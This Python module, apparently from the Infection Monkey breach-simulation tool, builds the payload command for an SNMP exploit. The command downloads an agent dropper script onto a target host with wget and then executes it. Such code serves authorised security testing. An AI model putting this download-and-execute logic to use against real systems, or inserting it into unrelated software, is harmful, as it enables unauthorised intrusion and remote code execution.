import logging

from agentpluginapi import TargetHost

from common.command_builder import (
    AgentMode,
    ILinuxAgentCommandBuilder,
    LinuxDownloadMethod,
    LinuxDownloadOptions,
    LinuxRunOptions,
)
from infection_monkey.exploit.tools.helpers import get_dropper_script_dst_path

logger = logging.getLogger(__name__)


def build_snmp_command(
    target_host: TargetHost,
    agent_download_url: str,
    agent_command_builder: ILinuxAgentCommandBuilder,
) -> str:
    dropper_script_dst_path = get_dropper_script_dst_path(target_host)
    download_options = LinuxDownloadOptions(
        download_method=LinuxDownloadMethod.WGET,
        download_url=agent_download_url,
        agent_destination_path=dropper_script_dst_path,
    )
    run_options = LinuxRunOptions(
        agent_mode=AgentMode.SCRIPT, agent_destination_path=dropper_script_dst_path
    )
    agent_command_builder.build_download_command(download_options)
    agent_command_builder.build_run_command(run_options)

    deploy_command = agent_command_builder.get_command()
    command = f'-c "{deploy_command}"'

    logger.debug(f"COMMAND: {command}")
    return command
